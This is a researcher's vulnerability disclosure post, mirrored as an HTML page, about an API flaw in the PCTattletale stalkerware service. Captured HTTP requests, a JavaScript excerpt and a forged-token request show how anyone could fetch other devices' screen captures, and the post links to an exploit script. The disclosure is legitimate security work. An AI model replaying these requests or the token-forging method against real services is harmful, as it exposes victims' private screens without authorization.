<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.ericdaigle.ca/pctattletale-leaking-screen-captures/">Original</a>
    <h1>PcTattletale leaks victims&#39; screen recordings to entire Internet</h1>
    
    <div id="readability-page-1" class="page"><div><article><section><time datetime="2024-05-22">May 22, 2024</time></section><h3 id="background">Background</h3><p><a href="https://www.pctattletale.com/">PCTattletale</a> is a simple stalkerware app. Rather than the sophisticated monitoring of many <a href="https://techcrunch.com/2024/02/12/new-thetruthspy-stalkerware-victims-is-your-android-device-compromised/">similarly insecure</a> competitors it simply asks for permission to record the targeted device (Android and Windows are supported) on infection. Afterward the observer can log in to an online portal and activate recording, at which point a screen capture is taken on the device and played on the target&#39;s browser.</p><p>I recently discovered a serious vulnerability in PCTattletale&#39;s API allowing any attacker to obtain the most recent screen capture recorded from any device on which PCTattletale is installed. It is distinct from the IDOR <a href="https://www.vice.com/en/article/m7ezj8/stalkerware-leaking-phone-screenshots-pctattletale">previously discovered by Jo Coscia</a>, and makes it trivial to actually obtain captures from other devices. As usual, Zack Whittaker has <a href="https://techcrunch.com/2024/05/22/spyware-found-on-hotel-check-in-computers/">excellent coverage</a> at TechCrunch. Unfortunately, PCTattletale have ignored Zack and I&#39;s attempts at contacting them to fix the issue, <del>so I can&#39;t give any more details here to avoid encouraging abuse of the vulnerability. Hopefully the stalkerware author(s) can be bothered to fix the issue soon, at which point I can give a full writeup. In the meantime,</del> if you think you may be a victim of stalkerware, run an antivirus scan — on Windows, Windows Defender seems to catch most known tools, on Android I&#39;ve heard good things about <a href="https://www.malwarebytes.com/stalkerware">Malwarebytes</a> — and have a look at the excellent advice from the <a href="https://stopstalkerware.org/information-for-survivors/">Coalition Against Stalkerware</a>.</p><h3 id="update-2024-05-26">UPDATE 2024-05-26</h3><p>Well, it&#39;s been an eventful few days. Check out <a href="https://maia.crimew.gay/posts/fuckstalkerware-6/">maia arson crimew&#39;s blog</a> for details. Given that PCTattletale&#39;s entire AWS infrastructure has now been <a href="https://ericdaigle.ca/docs/pctt-amazon-locked.png">locked by Amazon</a>, I can now give my original writeup.</p><p>I began by making an account on the website. This occurs in the following request-response, giving us an API key:</p><pre><code><span>METHOD: POST
</span><span>URL https://p200wi0b00.execute-api.us-east-2.amazonaws.com/Prod/api/pctt/member/
</span><span>HEADERS
</span><span>Accept: application/json, text/javascript, */*; q=0.01
</span><span>Accept-Encoding: gzip, deflate, br
</span><span>Accept-Language: en-US,en;q=0.5
</span><span>Connection: keep-alive
</span><span>Content-Length: 74
</span><span>Content-Type: application/json
</span><span>Host: p200wi0b00.execute-api.us-east-2.amazonaws.com
</span><span>Origin: https://pctattletale.com
</span><span>Referer: https://pctattletale.com/
</span><span>Sec-Fetch-Dest: empty
</span><span>Sec-Fetch-Mode: cors
</span><span>Sec-Fetch-Site: cross-site
</span><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span>
</span><span>{&#34;Username&#34;: &#34;blah@blah.com&#34;, &#34;Password&#34;: &#34;42d388f8b1db997faaf7dab487f11290&#34;} // MD5 of the password
</span><span>
</span><span>STATUS: 200 OK
</span><span>HEADERS
</span><span>Access-Control-Allow-Origin: *
</span><span>Connection: keep-alive
</span><span>Content-Length: 112
</span><span>Content-Type: text/plain; charset=utf-8
</span><span>Date: Tue, 14 May 2024 16:12:35 GMT
</span><span>Strict-Transport-Security: max-age=2592000
</span><span>Via: 1.1 207f5507d6d59dcf535e37d1db1f70bc.cloudfront.net (CloudFront)
</span><span>x-amz-apigw-id: XxMKGGEyiYcEocA=
</span><span>X-Amz-Cf-Id: L-w5nC30_R1FQhALRW93ifWgmgPLB26TE31RLRqZuZDb7iR5Ft1KGg==
</span><span>X-Amz-Cf-Pop: MXP53-P2
</span><span>x-amzn-RequestId: 29cbf7ba-e16b-49a4-9435-323956b0f4e2
</span><span>X-Amzn-Trace-Id: Root=1-66438d73-5fec59847a24356d76502520;Parent=4f04524f333e8710;Sampled=0;lineage=95e70599:0
</span><span>X-Cache: Miss from cloudfront
</span><span>
</span><span>{&#34;APIKey&#34;:&#34;89df2e57-2a4b-4e39-800a-8d1cc014d63b&#34;,&#34;ResponseTime&#34;:&#34;2024-05-14T16:12:35.597104+00:00&#34;,&#34;MemberID&#34;:0}
</span></code></pre><p>The API key seems to serve as our account ID.</p><p>Once the account is made, we are given a link to an APK to install on the target device. This installation proceeds as usual for a stalkerware app: we log in to the account we created and give a bunch of required permissions. After that, we can log into the dashboard in the browser and see our devices.</p><p>For each device, a thumbnail of a device screenshot is displayed. When we click on one, we see a &#34;screen capture&#34;: it actually turns out to be a series of screenshots displayed quickly in a slideshow, creating a sort of stop-motion video. Since I&#39;m using the free trial, I can only see the first few seconds. These screenshots seem like something IDOR-able, so let&#39;s take a look at the requests.</p><p>Playing the video, we can see the screenshots being retrieved in the following request-responses:</p><pre><code><span>METHOD: GET
</span><span>URL https://pctattletalev2.s3-accelerate.amazonaws.com/62198/20240513/android/1715604626.jpg
</span><span>HEADERS Accept: image/avif,image/webp,*/*
</span><span>Accept-Encoding: gzip, deflate, br
</span><span>Accept-Language: en-US,en;q=0.5
</span><span>Connection: keep-alive
</span><span>Host: pctattletalev2.s3-accelerate.amazonaws.com
</span><span>Referer: https://pctattletale.com/
</span><span>Sec-Fetch-Dest: empty
</span><span>Sec-Fetch-Mode: no-cors
</span><span>Sec-Fetch-Site: cross-site
</span><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span>
</span><span>STATUS: 200 OK
</span><span>HEADERS
</span><span>Accept-Ranges: bytes
</span><span>Connection: keep-alive
</span><span>Content-Length: 38661
</span><span>Content-Type: image/jpeg
</span><span>Date: Tue, 14 May 2024 17:11:31 GMT
</span><span>ETag: &#34;a4a22ad1c62b70489757567ff678c593&#34;
</span><span>Last-Modified: Mon, 13 May 2024 19:50:32 GMT
</span><span>Server: AmazonS3
</span><span>Via: 1.1 c704491f877b150c768ef14eb188ed46.cloudfront.net (CloudFront)
</span><span>X-Amz-Cf-Id: O0Nsl1S5yP2BPmHtdLIZ_6cARBxZErn-xKRaON7XhQ_B8_HwBG8Wiw==
</span><span>X-Amz-Cf-Pop: EWR53-C2
</span><span>x-amz-id-2: 8wXPc+8xWC9/eXGwVqbDiAwP34lROWR7McJqzVVTOqrzBCtspIr+7cbp83OyuMysICXB+ubBxA0=
</span><span>x-amz-request-id: JRCP4QW6QVSCB6HJ
</span><span>x-amz-server-side-encryption: AES256
</span><span>X-Cache: Miss from cloudfront
</span><span>
</span><span>*the screenshot of my device*
</span></code></pre><p>Looking at the URL, it&#39;s in the format (id of the device I added)/(date)/(timestamp).jpg. There&#39;s no authentication happening at all here, so this is an IDOR over different device IDs! I later learned this had been independently discovered by Jo Coscia as mentioned above.</p><p>Another interesting note looking at the screenshots is that they aren&#39;t taken every second. They are spaced out in seemingly random intervals, mostly concentrated between 1 and 10 seconds. This explains why the &#34;video&#34; in the browser is so choppy.</p><p>If we know the address of one screenshot for a device, we can reasonably poke around neighbouring timestamps to find the rest of the capture. Unfortunately there are 86400 timestamps per day, so enumerating this across all days and all devices would take forever.</p><p>When we load the devices overview, the thumbnail we&#39;re shown is of that device&#39;s <em>latest</em> screenshot. I wonder how that&#39;s being accessed? Let&#39;s reload the page and look at the requests again.</p><p>We find this:</p><pre><code><span>METHOD: POST
</span><span>URL: https://5uw7yeva9g.execute-api.us-east-2.amazonaws.com/Prod/api/pctt/member/ffe3fc02-46d2-4275-a156-e65f2ae2ddad/62198/Live/
</span><span>HEADERS
</span><span>Accept: application/json, text/javascript, */*; q=0.01
</span><span>Accept-Encoding: gzip, deflate, br
</span><span>Accept-Language: en-US,en;q=0.5
</span><span>Connection: keep-alive
</span><span>Content-Length: 44
</span><span>Content-Type: application/json
</span><span>Host: 5uw7yeva9g.execute-api.us-east-2.amazonaws.com
</span><span>Origin: https://pctattletale.com
</span><span>Referer: https://pctattletale.com/
</span><span>Sec-Fetch-Dest: empty
</span><span>Sec-Fetch-Mode: cors
</span><span>Sec-Fetch-Site: cross-site
</span><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span>
</span><span>{&#34;Token&#34;: &#34;07c7aa47c311b2e90b0cc50b53986141&#34;}
</span><span>
</span><span>STATUS: 200 OK
</span><span>HEADERS
</span><span>Access-Control-Allow-Origin: *
</span><span>Connection: keep-alive
</span><span>Content-Length: 133
</span><span>Content-Type: text/plain; charset=utf-8
</span><span>Date: Tue, 14 May 2024 17:12:06 GMT
</span><span>Strict-Transport-Security: max-age=2592000
</span><span>Via: 1.1 f6acfb143216fabf7be9b3a603a486ae.cloudfront.net (CloudFront)
</span><span>x-amz-apigw-id: XxU3-Fk9iYcElIQ=
</span><span>X-Amz-Cf-Id: W0ypHoXaeNis5e7yjC1y619qE35BQNfRBPhp1odSFoRiBq6W6sUVjg==
</span><span>X-Amz-Cf-Pop: JFK50-P7
</span><span>x-amzn-RequestId: 0c173b4d-0217-4300-956e-2cf33ad4caaf
</span><span>X-Amzn-Trace-Id: Root=1-66439b65-191b7f0a162b922a6d3de532;Parent=7893959ccf48044c;Sampled=0;lineage=63f6feca:0
</span><span>X-Cache: Miss from cloudfront
</span><span>
</span><span>{&#34;lastScreenShot&#34;:&#34;https://pctattletalev2.s3-accelerate.amazonaws.com/62198/20240513/android/1715604626.jpg&#34;,&#34;idleTime&#34;:&#34;1715604626&#34;}
</span></code></pre><p>So that&#39;s how it gets the most recent screenshot. If we could get this for a device, we could easily get the rest of the capture! Unfortunately it seems to be protected in two ways: the URL contains the API Key (an unguessable UUID), and there&#39;s a token.</p><p>While looking for the last request, I noticed a bunch of JavaScript being pulled in from pctattletale.com. Most names seemed pretty innocuous, but on seeing &#34;member.area.dashboard.js&#34; I decided to take a look and see if I could find where that token was coming from. Incredibly, I found the following code for the request to update a device&#39;s status:</p><pre data-lang="javascript"><code data-lang="javascript"><span>function </span><span>updateDevice</span><span>(</span><span>device</span><span>, </span><span>index</span><span>) {
</span><span>  </span><span>var </span><span>deviceToken </span><span>= </span><span>md5</span><span>(</span><span>API_KEY </span><span>+ &#34;&#34; + </span><span>device</span><span>.</span><span>DeviceID</span><span>);
</span><span>
</span><span>  </span><span>//  Call Login WebService
</span><span>  </span><span>$</span><span>.</span><span>ajax</span><span>({
</span><span>      method: &#34;</span><span>POST</span><span>&#34;,
</span><span>      crossDomain: </span><span>true</span><span>,
</span><span>      contentType: &#34;</span><span>application/json</span><span>&#34;,
</span><span>      dataType: &#34;</span><span>json</span><span>&#34;,
</span><span>      url: </span><span>AWS_BASE_URL_LIVE </span><span>+ &#34;</span><span>api/pctt/member/</span><span>&#34; + </span><span>API_KEY </span><span>+ &#34;</span><span>/</span><span>&#34; + </span><span>device</span><span>.</span><span>DeviceID </span><span>+ &#34;</span><span>/Live/</span><span>&#34;,
</span><span>      data: JSON.</span><span>stringify</span><span>({
</span><span>        Token: </span><span>deviceToken
</span><span>      })
</span><span>
</span><span>    })
</span><span>    .</span><span>success</span><span>(</span><span>function</span><span>(</span><span>data</span><span>) {
</span><span>
</span><span>    [...]
</span><span>
</span><span>    })
</span><span>    .</span><span>fail</span><span>(</span><span>function</span><span>() {
</span><span>
</span><span>    [...]
</span><span>
</span><span>    });
</span></code></pre><p>So the token is generated on the client-side, and is just MD5 of the device ID from the URL appended to the API key from account creation. Knowing this it is trivial to generate my own token and confirm that it matches the one being used in the requests. But I still can&#39;t get other devices&#39; last screenshots because the URL and token both have the wrong API key, right?</p><p>Let&#39;s give it a try. I make a token using my API key and the device ID one less than mine, and resend the above request with the corresponding url:</p><pre><code><span>METHOD: POST
</span><span>URL: https://5uw7yeva9g.execute-api.us-east-2.amazonaws.com/Prod/api/pctt/member/ffe3fc02-46d2-4275-a156-e65f2ae2ddad/62197/Live/
</span><span>HEADERS
</span><span>Accept: application/json, text/javascript, */*; q=0.01
</span><span>Accept-Encoding: gzip, deflate, br
</span><span>Accept-Language: en-US,en;q=0.5
</span><span>Connection: keep-alive
</span><span>Content-Length: 44
</span><span>Content-Type: application/json
</span><span>Host: 5uw7yeva9g.execute-api.us-east-2.amazonaws.com
</span><span>Origin: https://pctattletale.com
</span><span>Referer: https://pctattletale.com/
</span><span>Sec-Fetch-Dest: empty
</span><span>Sec-Fetch-Mode: cors
</span><span>Sec-Fetch-Site: cross-site
</span><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
</span><span>
</span><span>{&#34;Token&#34;: &#34;7b431465c49fc326546d565315773a17&#34;}
</span></code></pre><p>This happily gives me the lastScreenshot response for device ID 62197, which I do not own. It will do so for any device ID regardless of the UUID used in the URL and token.</p><p>Now that we can access any screenshot from any device and know the address of the last screenshot of the most recent recording, it&#39;s pretty easy to put together a script to leak the entirety of that recording. There&#39;s a minor annoyance in how the screenshots are taken at an irregular interval: we can&#39;t just subtract a certain amount of seconds. Instead we&#39;ll use a heuristic: we&#39;ll start with the last screenshot and subtract one second at a time, downloading from each and seeing if we get a valid photo or the error XML that comes up if no screenshot was taken at that second. If we get the error XML 20 times in a row, we&#39;ll assume the recording is over and give up.</p><p>Together with the login and token code, this yields a <a href="https://paste.sr.ht/blob/740b840d0e1d9cf3cf11075e6e78ddde4f812c0c">simple exploit script</a> That downloads the most recent screen capture from every device within the chosen range of IDs.</p><p>As described in better detail in maia&#39;s blog linked above, someone took my original post as inspiration and was able to recover PCTattletale&#39;s entire database, among other things. While the exploit was unrelated to mine, it was about equally trivial... another shining example of security practices from the stalkerware industry.</p><h3 id="timeline">Timeline</h3><ul><li>2024-05-12: initial analysis</li><li>2024-05-13: proof of concept script written, contacted developers and Zack Whittaker at TechCrunch</li><li>2024-05-17: Zack contacts developers</li><li>2024-05-22: publication here and in TechCrunch, still no response from developers</li><li>2024-05-26: post updates with full writeup</li></ul></article></div></div>
  </body>
</html>
